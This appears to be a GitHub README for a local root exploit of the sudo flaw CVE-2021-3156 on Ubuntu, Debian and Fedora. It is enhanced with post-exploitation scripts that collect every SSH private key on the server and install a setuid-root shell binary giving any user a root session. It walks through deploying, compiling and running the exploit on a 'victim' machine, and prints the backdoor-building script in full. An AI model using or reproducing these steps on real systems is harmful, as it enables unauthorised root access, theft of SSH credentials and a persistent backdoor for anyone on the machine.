# PE_CVE-CVE-2021-3156
Exploit for Ubuntu 20.04 using CVE-2021-3156 enhanced with simple and automated post-exploitation scripts

Besides the root shell you can have:

-A .txt file with all the id_rsa ssh keys configured in the server. See the script: 
[get_all_ssh_keys.sh](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/blob/main/get_all_ssh_keys.sh)


-A privshell executable that allows any user to start a root shell (working on fixing the gcc error). See the script: 
[create_privshell.sh](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/blob/main/create_privshell.sh)


## PoC for the PE_CVE-CVE-2021-3156.

### Requirements

In order to have a successful result, it is necessary that the victim machine has one of the following versions of OS and Sudo: 
 
 -Ubuntu 20.04 (Sudo 1.8.31)
 
 -Debian 10 (Sudo 1.8.27)
 
 -Fedora 33 (Sudo 1.9.2)

 
![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/6cdd3ad0-34af-4b29-81d9-838c757b046f)

In order to make my VM vulnerable, I downgraded my verision of sudo with the following command:
```
$ sudo apt install sudo=1.8.31-1ubuntu1
```

### Exploit

The exploit can work as long as access to the victim system is gained with a user without considerable privileges.

![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/b86c0ad5-32bf-4b9e-9270-a0c3a1434dc7)

You can clone the repo to the victim´s machine or your local machine and load it with wget

![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/064ba0d1-88be-4347-b20f-08dc80fc7747)

Execute the command "make" to compile the .c files according to the vulnerability
![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/8d486f7e-7c06-456c-be71-1ec5e775e64b)

You´ll get the exploit file, so youu can run it with "./"
You can now see two files generated in the repository, one that holds all the ssh keys registered on the system and the executable SUID file that grants a root session to all users. (highlighted in purple)
![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/cdc903a9-2c55-4596-a2c5-2e3ea9f02d31)

You might see an error like the following one:

![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/2dcb86bf-d1b7-4c62-87a5-fc23b084431a)

I'm still trying to solve the error, but I assume it's the shell that generates the exploit. I tried running the ./create_privshell.sh command from root by accessing with sudo su from a user with appropriate permissions and the script compilation was fine. Alternatively it can be compiled on a different machine and copied over to the victim, that´s why the existence of a wget request.

The script to compile is the following:

```
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > privshell.c
gcc -o privshell privshell.c
rm privshell.c
chown root:root privshell
chmod u+s privshell
```
You can now read the .txt files with all de ssh keys and use the privshell until I fix the gcc error
![image](https://github.com/PurpleOzone/PE_CVE-CVE-2021-3156/assets/111320119/3a30fa3d-9d88-4080-9120-a1caa3f7d5b4)

## ABOUT CVE-2021-3156.

